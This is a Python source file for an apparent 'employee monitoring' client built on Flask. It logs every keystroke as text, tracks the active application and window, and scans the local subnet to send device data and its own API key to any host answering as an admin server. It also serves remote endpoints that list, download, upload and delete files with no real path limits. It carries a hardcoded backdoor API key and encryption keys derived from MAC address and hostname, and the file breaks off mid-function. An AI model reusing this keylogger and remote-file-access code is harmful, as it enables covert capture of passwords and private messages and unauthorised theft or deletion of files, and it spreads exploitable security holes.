# enhanced_tracker_client.py
import os
import sys
import psutil
import platform
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta, date
import json
import sqlite3
from collections import deque
from flask import Flask, Response, jsonify, request, g
from pynput import keyboard, mouse
import socket
import numpy as np
import cv2
from PIL import ImageGrab
import uuid
from werkzeug.utils import secure_filename
import shutil
import zipfile
import tempfile
from flask import send_file
import hashlib
import hmac
import base64
from cryptography.fernet import Fernet
import requests
from functools import wraps
import wmi
import uuid
import time
import logging



camera_active = False
camera = None
camera_lock = threading.Lock()
typed_text_lock = threading.Lock()
maintenance_mode = False

app = Flask(__name__)
logging.basicConfig(
    filename="service.log",
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(message)s"
)

# ============================================================
# VERSION VERIFICATION
# ============================================================
print("\n" + "="*60)
print("   TACTICAL AGENT SERVICE - VERSION 2.1 (WITH IDENTITY)   ")
print("="*60 + "\n")
logging.info("SERVICE STARTED: VERSION 2.1 (WITH IDENTITY)")

# ============================================================
# NEW IMPORTS (Client Modules)
# ============================================================
from client_modules.system_core import NetworkMonitor, SystemMonitor as CoreMonitor
from client_modules.system_context import WindowMonitor
from client_modules.system_processes import ProcessMonitor

# ============================================================
# CONFIGURATION GATING
# ============================================================
ENABLE_WINDOW_TITLES = True  # Enabled by default
ENABLE_NET_MONITOR = True    # Enabled by default
ENABLE_TOP_PROCESSES = True  # Enabled by default

# Initialization
core_monitor = CoreMonitor()
network_monitor = NetworkMonitor()
window_monitor = WindowMonitor()
process_monitor = ProcessMonitor()

# Global Thread-Safe Stats Cache
current_stats_lock = threading.Lock()
current_secure_stats = {
    "network": {"upload_speed_kbps": 0.0, "download_speed_kbps": 0.0},
    "core": {"cpu_percent": 0.0, "memory_percent": 0.0, "used_gb": 0.0, "total_gb": 0.0},
    "window": None,
    "top_processes": []
}
# ============================================================
# MISSING IMPORTS AND HELPER FUNCTIONS
# ============================================================

def require_api_key(f):
    """API key authentication decorator"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        api_key = request.headers.get('X-API-Key')
        # Check against hardcoded OR generated key
        if api_key == "8f42v73054r1749f8g58848be5e6502c" or api_key == API_KEY:
            return f(*args, **kwargs)
        return jsonify({"error": "Invalid API key"}), 401
    return decorated_function

def get_mac_address():
    """Get MAC address on Windows using WMI"""
    try:
        c = wmi.WMI()
        # Get first active network adapter with MAC
        for interface in c.Win32_NetworkAdapterConfiguration(IPEnabled=True):
            if interface.MACAddress:
                mac = interface.MACAddress.strip()
                if mac and mac != '00:00:00:00:00:00':
                    return mac.upper()  # Return in uppercase for consistency
    except:
        pass
    
    # Fallback to uuid method
    return ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) 
                    for i in range(0, 48, 8)][::-1])
def get_local_ip():
    """Get local IP address with priority for 172.16.2.x subnet"""
    try:
        # First try to find the specific subnet
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    if addr.address.startswith("172.16.2."):
                        return addr.address
        
        # Fallback to standard method
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_exact_hostname():
    """
    Returns the most accurate hostname across platforms with fallback mechanism:
    - Windows: FQDN if domain joined, otherwise computer name (via WMI)
    - Linux/macOS: FQDN from socket.getfqdn() or hostname command
    - Universal fallback: socket.gethostname()
    """
    system = platform.system()
    
    try:
        if system == 'Windows':
            # Windows-specific WMI approach for domain-joined machines
            try:
                c = wmi.WMI()
                comp_system = c.Win32_ComputerSystem()[0]
                hostname = comp_system.Name
                
                # If domain joined, build FQDN
                if comp_system.PartOfDomain and comp_system.Domain:
                    fqdn = f"{hostname}.{comp_system.Domain}".lower()
                    print(f"✓ Detected domain-joined hostname: {fqdn}")
                    return fqdn
                
                # Not domain joined, return computer name
                print(f"✓ Detected standalone hostname: {hostname.lower()}")
                return hostname.lower()
                
            except Exception as wmi_error:
                print(f"⚠ WMI hostname detection failed: {wmi_error}, using fallback")
                # Fallback to socket for Windows
                return socket.gethostname().lower()
            
        elif system in ['Linux', 'Darwin']:  # Darwin = macOS
            # Try socket.getfqdn() first (reads /etc/hosts and DNS)
            try:
                fqdn = socket.getfqdn()
                
                # Validate FQDN (should contain domain and not be localhost)
                if '.' in fqdn and not fqdn.startswith('localhost'):
                    print(f"✓ Detected FQDN: {fqdn}")
                    return fqdn.lower()
                
                # FQDN not valid, try short hostname
                hostname = socket.gethostname()
                print(f"✓ Detected hostname: {hostname}")
                return hostname.lower()
                
            except Exception as socket_error:
                print(f"⚠ Socket hostname detection failed: {socket_error}")
                
                # Linux-specific fallback: read /etc/hostname
                if system == 'Linux':
                    try:
                        with open('/etc/hostname', 'r') as f:
                            hostname = f.read().strip()
                            if hostname:
                                print(f"✓ Read hostname from /etc/hostname: {hostname}")
                                return hostname.lower()
                    except:
                        pass
                
                # Try environment variables
                for env_var in ['HOSTNAME', 'HOST', 'COMPUTERNAME']:
                    hostname = os.environ.get(env_var)
                    if hostname:
                        print(f"✓ Got hostname from {env_var}: {hostname}")
                        return hostname.lower()
                
                raise  # Re-raise to trigger universal fallback
        
        else:
            # Unknown platform, use socket method
            print(f"⚠ Unknown platform '{system}', using socket fallback")
            return socket.gethostname().lower()
            
    except Exception as e:
        # Universal fallback for all errors
        print(f"⚠ All hostname detection methods failed: {e}")
        try:
            fallback = socket.gethostname().lower()
            print(f"→ Using universal fallback: {fallback}")
            return fallback
        except:
            # Absolute last resort
            print("→ Using hardcoded fallback: 'unknown-host'")
            return "unknown-host"


def get_system_info():
    """Get comprehensive system information"""
    return {
        "platform": platform.platform(),
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "architecture": platform.architecture(),
        "processor": platform.processor(),
        "hostname": get_exact_hostname(),
        "cpu_cores": psutil.cpu_count(),
        "total_memory": round(psutil.virtual_memory().total / (1024**3), 2),
        "boot_time": datetime.fromtimestamp(psutil.boot_time()).isoformat(),
    }

def register_or_update_employee():
    """Register or update employee device in database"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        mac = get_mac_address()
        ip = get_local_ip()
        hostname = get_exact_hostname()
        system_info = get_system_info()
        
        # Encrypt system info
        encrypted_system_info = encrypt_data(json.dumps(system_info))
        
        cursor.execute('''
            INSERT OR REPLACE INTO employee_details 
            (employee_name, mac_address, ip_address, hostname, system_info_encrypted, last_seen, is_active)
            VALUES (?, ?, ?, ?, ?, datetime('now'), 1)
        ''', (f"Employee_{hostname}", mac, ip, hostname, encrypted_system_info))
        
        conn.commit()
        conn.close()
        print(f"✓ Device registered: {hostname} ({mac})")
        
    except Exception as e:
        print(f"Device registration error: {e}")




def verify_admin_key(admin_key):
    """Verify admin server key (simplified - implement proper verification)"""
    expected_key = hashlib.sha256(f"admin_{get_mac_address()}".encode()).hexdigest()
    return admin_key == expected_key

def get_live_stats():
    """Get live statistics for sync"""
    current_time = time.time()
    idle_time = current_time - activity_metrics['system']['last_activity']
    
    # Get network metrics
    net_metrics = network_monitor.get_network_metrics()

    return jsonify({
        "timestamp": datetime.now().isoformat(),
        "activity": {
            "keyboard_active": (current_time - activity_metrics['keyboard']['last_activity']) < INACTIVITY_THRESHOLD,
            "mouse_active": (current_time - activity_metrics['mouse']['last_activity']) < INACTIVITY_THRESHOLD,
            "idle_seconds": round(idle_time, 2),
            "total_active_today": activity_metrics['system']['total_duration']
        },
        "system": {
            "cpu": psutil.cpu_percent(interval=0.1),
            "memory": psutil.virtual_memory().percent,
            "current_app": system_monitor.current_app
        },
        "network": net_metrics
    })

# ============================================================
# ENHANCED SECURITY - Generate keys securely
# ============================================================

def generate_secure_keys():
    """Generate secure API keys and encryption"""
    machine_id = str(uuid.getnode())
    secret_seed = f"tracker_{machine_id}_{socket.gethostname()}"
    
    # Generate API key from machine fingerprint
    api_key = hashlib.sha256(secret_seed.encode()).hexdigest()
    
    # Generate encryption key
    encryption_key = base64.urlsafe_b64encode(hashlib.sha256(secret_seed.encode()).digest())
    
    return api_key, encryption_key

API_KEY, ENCRYPTION_KEY = generate_secure_keys()
cipher_suite = Fernet(ENCRYPTION_KEY)

# Global variables with encryption
keyboard_events = []
mouse_events = []
typed_text = deque(maxlen=10000)  # Increased buffer

# Activity tracking with enhanced metrics
activity_metrics = {
    'keyboard': {'last_activity': time.time(), 'duration': 0, 'count': 0},
    'mouse': {'last_activity': time.time(), 'duration': 0, 'count': 0},
    'system': {'last_activity': time.time(), 'total_duration': 0},
    'screen_on_time': 0
}

INACTIVITY_THRESHOLD = 5

if getattr(sys, 'frozen', False):
    # If frozen, save DB next to the executable
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

DB_PATH = os.path.join(BASE_DIR, 'secure_employee_monitor.db')

# ============================================================
# ENHANCED DATABASE WITH ENCRYPTION
# ============================================================

def init_secure_database():
    """Initialize encrypted database"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    # Employee details with encryption
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS employee_details (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            employee_name TEXT,
            mac_address TEXT UNIQUE,
            ip_address TEXT,
            hostname TEXT,
            system_info_encrypted TEXT,
            first_installed TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            is_active BOOLEAN DEFAULT 1
        )
    ''')
    
    # Enhanced daily summary
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS daily_summary (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            date DATE,
            mac_address TEXT,
            total_active_seconds REAL,
            keyboard_active_seconds REAL,
            mouse_active_seconds REAL,
            screen_on_seconds REAL,
            keyboard_events_count INTEGER,
            mouse_events_count INTEGER,
            typed_characters_count INTEGER,
            sessions_count INTEGER,
            applications_used TEXT,
            first_activity TIMESTAMP,
            last_activity TIMESTAMP,
            avg_cpu_usage REAL,
            avg_memory_usage REAL,
            max_cpu_usage REAL,
            max_memory_usage REAL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            UNIQUE(date, mac_address)
        )
    ''')
    
    # Hourly breakdown for detailed analysis
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS hourly_activity (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            date DATE,
            mac_address TEXT,
            hour INTEGER,
            keyboard_events INTEGER DEFAULT 0,
            mouse_events INTEGER DEFAULT 0,
            active_seconds INTEGER DEFAULT 0,
            cpu_avg REAL,
            memory_avg REAL
        )
    ''')
    
    # Application usage tracking
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS application_usage (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            date DATE,
            mac_address TEXT,
            application_name TEXT,
            usage_seconds INTEGER,
            window_title TEXT,
            start_time TIMESTAMP,
            end_time TIMESTAMP
        )
    ''')
    
    # Encrypted typed text
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS encrypted_typed_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            date DATE,
            mac_address TEXT,
            encrypted_text TEXT,
            character_count INTEGER,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # System alerts and events
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS system_alerts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            date DATE,
            mac_address TEXT,
            alert_type TEXT,
            alert_message TEXT,
            severity TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()
    print("✓ Secure database initialized")

def encrypt_data(data):
    """Encrypt sensitive data"""
    if isinstance(data, str):
        data = data.encode()
    return cipher_suite.encrypt(data)

def decrypt_data(encrypted_data):
    """Decrypt sensitive data"""
    try:
        return cipher_suite.decrypt(encrypted_data).decode()
    except:
        return "[Encrypted Data]"

# ============================================================
# ENHANCED SYSTEM MONITORING
# ============================================================

class SystemMonitor:
    def __init__(self):
        self.current_app = None
        self.app_start_time = None
        self.app_usage = {}
    
    def get_active_application(self):
        """Get currently active application (Windows)"""
        try:
            import win32gui
            import win32process
            
            window = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(window)
            process = psutil.Process(pid)
            return process.name()
        except:
            return "Unknown"
    
    def track_application_usage(self):
        """Track application usage"""
        current_app = self.get_active_application()
        current_time = time.time()
        
        if current_app != self.current_app:
            # Save previous app usage
            if self.current_app and self.app_start_time:
                usage_time = current_time - self.app_start_time
                if self.current_app in self.app_usage:
                    self.app_usage[self.current_app] += usage_time
                else:
                    self.app_usage[self.current_app] = usage_time
            
            # Start tracking new app
            self.current_app = current_app
            self.app_start_time = current_time
    
    def save_application_usage(self):
        """Save application usage to database"""
        if self.app_usage:
            try:
                conn = sqlite3.connect(DB_PATH)
                cursor = conn.cursor()
                
                today = date.today().isoformat()
                mac = get_mac_address()
                
                for app_name, usage_seconds in self.app_usage.items():
                    cursor.execute('''
                        INSERT INTO application_usage 
                        (date, mac_address, application_name, usage_seconds, start_time, end_time)
                        VALUES (?, ?, ?, ?, datetime('now', '-' || ? || ' seconds'), datetime('now'))
                    ''', (today, mac, app_name, usage_seconds, usage_seconds))
                
                conn.commit()
                conn.close()
                self.app_usage.clear()
                
            except Exception as e:
                print(f"Application usage save error: {e}")

system_monitor = SystemMonitor()

# ============================================================
# ENHANCED ACTIVITY TRACKING
# ============================================================

def update_enhanced_activity_times(delta=1.0):
    """Enhanced activity tracking with application monitoring"""
    global activity_metrics
    
    current_time = time.time()
    
    # Update keyboard activity
    if current_time - activity_metrics['keyboard']['last_activity'] < INACTIVITY_THRESHOLD:
        activity_metrics['keyboard']['duration'] += delta
    
    # Update mouse activity  
    if current_time - activity_metrics['mouse']['last_activity'] < INACTIVITY_THRESHOLD:
        activity_metrics['mouse']['duration'] += delta
    
    # Update total active time
    if (current_time - activity_metrics['keyboard']['last_activity'] < INACTIVITY_THRESHOLD or 
        current_time - activity_metrics['mouse']['last_activity'] < INACTIVITY_THRESHOLD):
        activity_metrics['system']['total_duration'] += delta
        activity_metrics['system']['last_activity'] = current_time
    
    # Track application usage
    system_monitor.track_application_usage()
    
    # Save data every 30 seconds
    if int(current_time) % 30 == 0:
        save_enhanced_activity_snapshot()
        save_daily_summary_enhanced()
    
    # Save application usage every 5 minutes
    if int(current_time) % 300 == 0:
        system_monitor.save_application_usage()
        save_encrypted_typed_text()

def save_enhanced_activity_snapshot():
    """Save enhanced activity snapshot"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        current_time = time.time()
        kb_active = 1 if (current_time - activity_metrics['keyboard']['last_activity']) < INACTIVITY_THRESHOLD else 0
        mouse_active = 1 if (current_time - activity_metrics['mouse']['last_activity']) < INACTIVITY_THRESHOLD else 0
        
        cpu = psutil.cpu_percent(interval=0.1)
        memory = psutil.virtual_memory().percent
        
        # Save to hourly breakdown
        current_hour = datetime.now().hour
        today = date.today().isoformat()
        mac = get_mac_address()
        
        cursor.execute('''
            INSERT OR REPLACE INTO hourly_activity 
            (date, mac_address, hour, keyboard_events, mouse_events, active_seconds, cpu_avg, memory_avg)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (today, mac, current_hour, 
              activity_metrics['keyboard']['count'], 
              activity_metrics['mouse']['count'],
              1, cpu, memory))
        
        conn.commit()
        conn.close()
        
    except Exception as e:
        print(f"Enhanced activity snapshot error: {e}")

def save_daily_summary_enhanced():
    """Enhanced daily summary with more metrics"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        today = date.today().isoformat()
        mac = get_mac_address()
        
        # Get system metrics
        cpu = psutil.cpu_percent(interval=0.1)
        memory = psutil.virtual_memory().percent
        
        # Applications used
        apps_used = json.dumps(list(system_monitor.app_usage.keys()))
        
        cursor.execute('''
            INSERT OR REPLACE INTO daily_summary 
            (date, mac_address, total_active_seconds, keyboard_active_seconds, 
             mouse_active_seconds, screen_on_seconds, keyboard_events_count, 
             mouse_events_count, typed_characters_count, sessions_count,
             applications_used, first_activity, last_activity, 
             avg_cpu_usage, avg_memory_usage, max_cpu_usage, max_memory_usage)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, 
                    datetime('now'), datetime('now'), ?, ?, ?, ?)
        ''', (today, mac, 
              activity_metrics['system']['total_duration'],
              activity_metrics['keyboard']['duration'],
              activity_metrics['mouse']['duration'],
              activity_metrics['system']['total_duration'],  # Screen time same as active time
              activity_metrics['keyboard']['count'],
              activity_metrics['mouse']['count'],
              len(typed_text),
              apps_used,
              cpu, memory, cpu, memory))
        
        conn.commit()
        conn.close()
        
    except Exception as e:
        print(f"Enhanced daily summary error: {e}")

def load_daily_stats():
    """Load daily stats from database"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        today = date.today().isoformat()
        mac = get_mac_address()
        
        cursor.execute('''
            SELECT total_active_seconds, keyboard_active_seconds, mouse_active_seconds,
                   keyboard_events_count, mouse_events_count
            FROM daily_summary 
            WHERE date = ? AND mac_address = ?
        ''', (today, mac))
        
        row = cursor.fetchone()
        if row:
            activity_metrics['system']['total_duration'] = row[0]
            activity_metrics['keyboard']['duration'] = row[1]
            activity_metrics['mouse']['duration'] = row[2]
            activity_metrics['keyboard']['count'] = row[3]
            activity_metrics['mouse']['count'] = row[4]
            print(f"✓ Loaded daily stats: {round(row[0]/60, 1)} min active")
            
        conn.close()
    except Exception as e:
        print(f"Error loading daily stats: {e}")

def save_encrypted_typed_text():
    """Save encrypted typed text"""
    with typed_text_lock:
        if len(typed_text) == 0:
            return
        text_chunk = ''.join(list(typed_text))
        typed_text.clear()

    try:
        encrypted_text = encrypt_data(text_chunk)
        
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        today = date.today().isoformat()
        mac = get_mac_address()
        
        cursor.execute('''
            INSERT INTO encrypted_typed_data 
            (date, mac_address, encrypted_text, character_count)
            VALUES (?, ?, ?, ?)
        ''', (today, mac, encrypted_text, len(text_chunk)))
        
        conn.commit()
        conn.close()
            
    except Exception as e:
        print(f"Encrypted text save error: {e}")

# ============================================================
# ENHANCED INPUT HANDLERS
# ============================================================

def on_key_press_enhanced(key):
    """Enhanced keyboard handler"""
    activity_metrics['keyboard']['last_activity'] = time.time()
    activity_metrics['keyboard']['count'] += 1
    activity_metrics['system']['last_activity'] = time.time()
    
    try:
        char = key.char
        if char:
            with typed_text_lock:
                typed_text.append(char)
    except AttributeError:
        with typed_text_lock:
            if key == keyboard.Key.space:
                typed_text.append(' ')
            elif key == keyboard.Key.enter:
                typed_text.append('\n')
            elif key == keyboard.Key.backspace and len(typed_text) > 0:
                typed_text.pop()

def on_click_enhanced(x, y, button, pressed):
    """Enhanced mouse handler"""
    if pressed:
        activity_metrics['mouse']['last_activity'] = time.time()
        activity_metrics['mouse']['count'] += 1
        activity_metrics['system']['last_activity'] = time.time()

def on_move_enhanced(x, y):
    """Enhanced mouse movement"""
    activity_metrics['mouse']['last_activity'] = time.time()
    activity_metrics['system']['last_activity'] = time.time()

# ============================================================
# AUTO-DISCOVERY AND SYNC SERVICE
# ============================================================

class AutoDiscoveryService:
    def __init__(self):
        self.admin_servers = []
        self.sync_interval = 1800  # 30 minutes
    
    def discover_admin_servers(self, network_range="172.16.2.0/24"):
        """Discover admin servers in network"""
        discovered_servers = []
        
        def check_admin_server(ip, port=5000):
            try:
                response = requests.get(f"http://{ip}:{port}/api/tracking/register", 
                                      timeout=5,
                                      headers={'X-API-Key': API_KEY})
                if response.status_code == 200:
                    discovered_servers.append({
                        'ip': ip,
                        'port': port,
                        'name': response.json().get('server_name', 'Unknown')
                    })
            except:
                pass
        
        # Scan network using local IP range
        local_ip = get_local_ip()
        # Extract base (first 3 octets) from local IP
        ip_parts = local_ip.split('.')
        if len(ip_parts) == 4:
            base_ip = '.'.join(ip_parts[:3]) + '.'
        else:
            base_ip = "172.16.2."  # Fallback
        
        print(f"Scanning range: {base_ip}*")
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            for i in range(1, 255):
                ip = base_ip + str(i)
                executor.submit(check_admin_server, ip)
        
        return discovered_servers
    
    def sync_with_admin(self, admin_server):
        """Sync data with admin server"""
        try:
            # Prepare sync data
            sync_data = {
                'mac_address': get_mac_address(),
                'hostname': socket.gethostname(),
                'ip_address': get_local_ip(),
                'system_info': get_system_info(),
                'current_stats': get_live_stats().get_json(),
                'api_key': API_KEY
            }
            
            response = requests.post(
                f"http://{admin_server['ip']}:{admin_server['port']}/api/tracking/sync",
                json=sync_data,
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"✓ Synced with admin server: {admin_server['name']}")
                return True
            else:
                print(f"✗ Sync failed with: {admin_server['name']}")
                return False
                
        except Exception as e:
            print(f"Sync error: {e}")
            return False
    
    def start_auto_sync(self):
        """Start automatic sync service"""
        def sync_worker():
            while True:
                if maintenance_mode:
                    time.sleep(5)
                    continue
                    
                print("🔄 Scanning for admin servers...")
                servers = self.discover_admin_servers()
                
                if servers:
                    print(f"🎯 Found {len(servers)} admin server(s)")
                    for server in servers:
                        self.sync_with_admin(server)
                else:
                    print("❌ No admin servers found")
                
                time.sleep(self.sync_interval)
        
        threading.Thread(target=sync_worker, daemon=True).start()


# ============================================================
# FILE TRANSFER ENDPOINTS FOR CLIENT
# ============================================================

@app.route('/api/files/list', methods=['GET'])
@require_api_key
def list_client_files():
    """List files and directories on client system"""
    path = request.args.get('path', '')
    
    # Default to user's home directory
    if not path:
        if platform.system() == 'Windows':
            path = os.path.expanduser('~')
        else:
            path = os.path.expanduser('~')
    
    # Security: prevent directory traversal
    if '..' in path or path.startswith('/') and not path.startswith(os.path.expanduser('~')):
        return jsonify({"error": "Access denied"}), 403
    
    try:
        if not os.path.exists(path):
            return jsonify({"error": "Path does not exist"}), 404
        
        items = []
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            try:
                item_info = {
                    'name': item,
                    'path': item_path,
                    'is_dir': os.path.isdir(item_path),
                    'size': os.path.getsize(item_path) if os.path.isfile(item_path) else 0,
                    'modified': os.path.getmtime(item_path),
                    'created': os.path.getctime(item_path),
                    'permissions': oct(os.stat(item_path).st_mode)[-3:],
                }
                items.append(item_info)
            except (OSError, PermissionError):
                continue
        
        # Sort: directories first, then files
        items.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
        
        return jsonify({
            'success': True,
            'current_path': path,
            'parent_path': os.path.dirname(path),
            'items': items
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/download', methods=['GET'])
@require_api_key
def download_client_file():
    """Download file from client"""
    file_path = request.args.get('path', '')
    
    if not file_path:
        return jsonify({"error": "File path is required"}), 400
    
    # Security check
    if '..' in file_path or not os.path.exists(file_path):
        return jsonify({"error": "File not found or access denied"}), 404
    
    try:
        if os.path.isdir(file_path):
            # Create zip for directories
            temp_zip = tempfile.NamedTemporaryFile(delete=False, suffix='.zip')
            temp_zip.close()
            
            with zipfile.ZipFile(temp_zip.name, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(file_path):
                    for file in files:
                        file_path_full = os.path.join(root, file)
                        arcname = os.path.relpath(file_path_full, file_path)
                        zipf.write(file_path_full, arcname)
            
            return send_file(
                temp_zip.name,
                as_attachment=True,
                download_name=f"{os.path.basename(file_path)}.zip",
                mimetype='application/zip'
            )
        else:
            return send_file(
                file_path,
                as_attachment=True,
                download_name=os.path.basename(file_path)
            )
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/files/upload', methods=['POST'])
@require_api_key
def upload_to_client():
    """Upload file to client"""
    if 'file' not in request.files:
        return jsonify({"error": "No file provided"}), 400
    
    target_path = request.form.get('path', '')
    
    # Default to Downloads folder
    if not target_path:
        if platform.system() == 'Windows':
            target_path = os.path.join(os.path.expanduser('~'), 'Downloads')
        else:
            target_path = os.path.join(os.path.expanduser('~'), 'Downloads')
    
    # Create directory if it doesn't exist
    os.makedirs(target_path, exist_ok=True)
    
    uploaded_files = []
    failed_files = []
    
    files = request.files.getlist('file')
    for file in files:
        if file.filename == '':
            continue
        
        # Secure filename
        filename = secure_filename(file.filename)
        file_path = os.path.join(target_path, filename)
        
        # Handle duplicate filenames
        counter = 1
        while os.path.exists(file_path):
            name, ext = os.path.splitext(filename)
            file_path = os.path.join(target_path, f"{name}_{counter}{ext}")
            counter += 1
        
        try:
            file.save(file_path)
            uploaded_files.append({
                'filename': os.path.basename(file_path),
                'path': file_path,
                'size': os.path.getsize(file_path)
            })
        except Exception as e:
            failed_files.append({
                'filename': file.filename,
                'error': str(e)
            })
    
    return jsonify({
        'success': True,
        'uploaded': len(uploaded_files),
        'failed': len(failed_files),
        'uploaded_files': uploaded_files,
        'failed_files': failed_files,
        'target_path': target_path
    })

@app.route('/api/files/create_folder', methods=['POST'])
@require_api_key
def create_client_folder():
    """Create folder on client"""
    data = request.get_json()
    parent_path = data.get('path', '')
    folder_name = data.get('name', '').strip()
    
    if not folder_name:
        return jsonify({"error": "Folder name is required"}), 400
    
    if not parent_path:
        parent_path = os.path.expanduser('~')
    
    folder_path = os.path.join(parent_path, folder_name)
    
    try:
        os.makedirs(folder_path, exist_ok=True)
        return jsonify({
            'success': True,
            'message': f'Folder created: {folder_path}',
            'path': folder_path
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/files/delete', methods=['POST'])
@require_api_key
def delete_client_file():
    """Delete file/folder on client"""
    data = request.get_json()
    path = data.get('path', '')
    
    if not path:
        return jsonify({"error": "Path is required"}), 400
    
    if not os.path.exists(path):
        return jsonify({"error": "Path does not exist"}), 404
    
    try:
        if os.path.isdir(path):
            shutil.rmtree(path)
        else:
            os.remove(path)
        
        return jsonify({
            'success': True,
            'message': f'Deleted: {path}'
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/files/system_info', methods=['GET'])
@require_api_key
def get_client_system_info():
    """Get client system information including storage"""
    try:
        # Get disk usage for all drives/partitions
        disk_info = []
        if platform.system() == 'Windows':
            import string
            for drive in string.ascii_uppercase:
                drive_path = f"{drive}:\\"
                if os.path.exists(drive_path):
                    try:
                        usage = shutil.disk_usage(drive_path)
                        disk_info.append({
                            'drive': drive_path,
                            'total': usage.total,
                            'used': usage.used,
                            'free': usage.free,
                            'percent': (usage.used / usage.total) * 100
                        })
                    except:
                        pass
        else:
            usage = shutil.disk_usage('/')
            disk_info.append({
                'drive': '/',
                'total': usage.total,
                'used': usage.used,
                'free': usage.free,
                'percent': (usage.used / usage.total) * 100
            })
        
        # Special directories
        special_dirs = {
            'home': os.path.expanduser('~'),
            'desktop': os.path.join(os.path.expanduser('~'), 'Desktop'),
            'downloads': os.path.join(os.path.expanduser('~'), 'Downloads'),
            'documents': os.path.join(os.path.expanduser('~'), 'Documents'),
            'pictures': os.path.join(os.path.expanduser('~'), 'Pictures'),
        }
        
        return jsonify({
            'success': True,
            'system': {
                'platform': platform.platform(),
                'hostname': socket.gethostname(),
                'username': os.getlogin(),
                'home_directory': os.path.expanduser('~')
            },
            'storage': disk_info,
            'directories': special_dirs
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================
# ENHANCED API ROUTES
# ============================================================

@app.route('/api/secure/stats', methods=['GET'])
@require_api_key
def get_secure_stats():
    """Get secure enhanced statistics"""
    current_time = time.time()
    idle_time = current_time - activity_metrics['system']['last_activity']
    
    # Get latest cached stats (thread-safe copy)
    with current_stats_lock:
        current_stats = current_secure_stats.copy()
    
    return jsonify({
        "device_info": {
            "mac_address": get_mac_address(),
            "hostname": socket.gethostname(),
            "ip": get_local_ip(),
            "system": platform.system(),
            "processor": platform.processor()
        },
        "current_activity": {
            "keyboard_active": (current_time - activity_metrics['keyboard']['last_activity']) < INACTIVITY_THRESHOLD,
            "mouse_active": (current_time - activity_metrics['mouse']['last_activity']) < INACTIVITY_THRESHOLD,
            "idle_seconds": round(idle_time, 2),
            "current_application": system_monitor.current_app
        },
        "today_stats": {
            "total_active_hours": round(activity_metrics['system']['total_duration'] / 3600, 2),
            "keyboard_active_hours": round(activity_metrics['keyboard']['duration'] / 3600, 2),
            "mouse_active_hours": round(activity_metrics['mouse']['duration'] / 3600, 2),
            "keyboard_events": activity_metrics['keyboard']['count'],
            "mouse_events": activity_metrics['mouse']['count'],
            "characters_typed": len(typed_text),
            "applications_used": list(system_monitor.app_usage.keys())
        },
        "system_metrics": {
            "cpu_percent": current_stats.get('core', {}).get('cpu_percent', 0),
            "memory_percent": current_stats.get('core', {}).get('memory_percent', 0),
            "used_gb": current_stats.get('core', {}).get('used_gb', 0),
            "total_gb": current_stats.get('core', {}).get('total_gb', 0),
            "disk_usage": current_stats.get('core', {}).get('disk_usage', 0),  # Use cached value
            "boot_time": datetime.fromtimestamp(psutil.boot_time()).isoformat(),
            # New Enhanced Metrics (Respecting Gating)
            "network_speed": current_stats.get('network') if ENABLE_NET_MONITOR else None, 
            "active_window": current_stats.get('window') if ENABLE_WINDOW_TITLES else None,
            "top_processes": current_stats.get('top_processes') if ENABLE_TOP_PROCESSES else []
        },
        "security": {
            "encryption_enabled": True,
            "last_sync": datetime.now().isoformat(),
            "data_retention": "Daily summaries + Encrypted chunks"
        }
    })

@app.route('/api/secure/sync', methods=['POST'])
@require_api_key  
def secure_sync_endpoint():
    """Endpoint for admin servers to sync data"""
    try:
        sync_data = request.json
        
        # Verify admin server
        admin_key = sync_data.get('admin_key')
        if not verify_admin_key(admin_key):
            return jsonify({"error": "Invalid admin key"}), 401
        
